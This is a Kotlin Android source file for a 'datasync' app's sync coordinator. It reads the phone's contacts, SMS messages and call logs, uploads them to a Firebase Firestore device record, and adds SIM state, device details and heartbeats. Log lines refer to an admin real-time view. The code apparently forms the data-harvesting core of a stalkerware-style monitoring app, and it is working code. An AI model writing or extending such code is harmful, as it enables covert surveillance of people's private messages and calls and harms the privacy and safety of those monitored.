package com.boxx.datasync.sync

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.tasks.await
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SyncCoordinator @Inject constructor(
    private val repository: DataRepository
) {
    private val mutex = Mutex()
    private var isPendingSync = false
    private var pendingFullSync = false

    suspend fun performSync(context: Context, isFullSync: Boolean) {
        if (mutex.isLocked) {
            isPendingSync = true
            if (isFullSync) pendingFullSync = true
            Log.d("SyncCoordinator", "SYNC_ALREADY_RUNNING_PENDING_SET")
            return
        }

        mutex.withLock {
            var currentFullSync = isFullSync
            do {
                val fullSyncToRun = currentFullSync || pendingFullSync
                isPendingSync = false
                pendingFullSync = false

                runSyncInternal(context, fullSyncToRun)

                if (isPendingSync) {
                    Log.d("SyncCoordinator", "PENDING_SYNC_STARTED")
                }
                currentFullSync = false // Only the first run or explicitly pending ones are full
            } while (isPendingSync)
        }
    }

    private suspend fun runSyncInternal(context: Context, isFullSync: Boolean) {
        val deviceId = DeviceIdHelper.getDeviceId(context)
        val prefs = PreferenceManager.getDefaultSharedPreferences(context)
        val now = System.currentTimeMillis()

        Log.d("SyncCoordinator", "SYNC_STARTED isFullSync=$isFullSync")

        try {
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                "syncStatus" to "Syncing",
                "lastError" to null
            ))

            Log.d("SyncCoordinator", "SYNC_UPLOAD_STARTED")

            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)

            val contactsAllowed = hasPermission(context, android.Manifest.permission.READ_CONTACTS)
            val smsAllowed = hasPermission(context, android.Manifest.permission.READ_SMS)
            val callsAllowed = hasPermission(context, android.Manifest.permission.READ_CALL_LOG)

            if (!contactsAllowed && !smsAllowed && !callsAllowed) {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                    "syncStatus" to "Error",
                    "lastError" to "Missing data permissions",
                    "lastSyncTime" to now
                ))
                Log.d("SyncCoordinator", "SYNC_UPLOAD_SUCCESS (No permissions, handled)")
                return
            }

            val contacts = if (contactsAllowed) DataHelper.fetchContacts(context, sinceTimestamp = lastContactSync) else emptyList()
            val sms = if (smsAllowed) DataHelper.fetchSMS(context, sinceTimestamp = lastSmsSync) else emptyList()
            val calls = if (callsAllowed) DataHelper.fetchCallLogs(context, sinceTimestamp = lastCallSync) else emptyList()

            repository.syncIncremental(deviceId, contacts, sms, calls)

            prefs.edit().apply {
                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOfOrNull { it.date } ?: now)
                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOfOrNull { it.date } ?: now)
            }.apply()

            val simState = DataHelper.getSimState(context)

            val notificationCount = try {
                FirebaseFirestore.getInstance().collection("devices").document(deviceId)
                    .collection("notifications").get().await().size()
            } catch (e: Exception) {
                0
            }

            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + simState + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "lastError" to null,
                "contactCount" to if (contactsAllowed) DataHelper.fetchContacts(context).size else 0,
                "smsCount" to if (smsAllowed) DataHelper.fetchSMS(context).size else 0,
                "callCount" to if (callsAllowed) DataHelper.fetchCallLogs(context).size else 0,
                "notificationCount" to notificationCount
            ))

            Log.d("SyncCoordinator", "SYNC_UPLOAD_SUCCESS")
            Log.d("SyncCoordinator", "ADMIN_REALTIME_UPDATED")
        } catch (e: CancellationException) {
            Log.e("SyncCoordinator", "SYNC_CANCELLED_REASON: ${e.message}")
            try {
                repository.updateDeviceInfoMap(deviceId, mapOf(
                    "syncStatus" to "Error",
                    "lastError" to "Job cancelled: ${e.message}",
                    "heartbeatAt" to System.currentTimeMillis()
                ))
            } catch (_: Exception) {}
            throw e
        } catch (e: Exception) {
            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
            Log.e("SyncCoordinator", "SYNC_UPLOAD_FAILED", e)
            try {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                    "lastSyncTime" to System.currentTimeMillis(),
                    "syncStatus" to "Error",
                    "lastError" to message
                ))
            } catch (_: Exception) {}
        }
    }

    private fun hasPermission(context: Context, permission: String) =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    private fun baseDeviceMap(deviceId: String, now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )
}
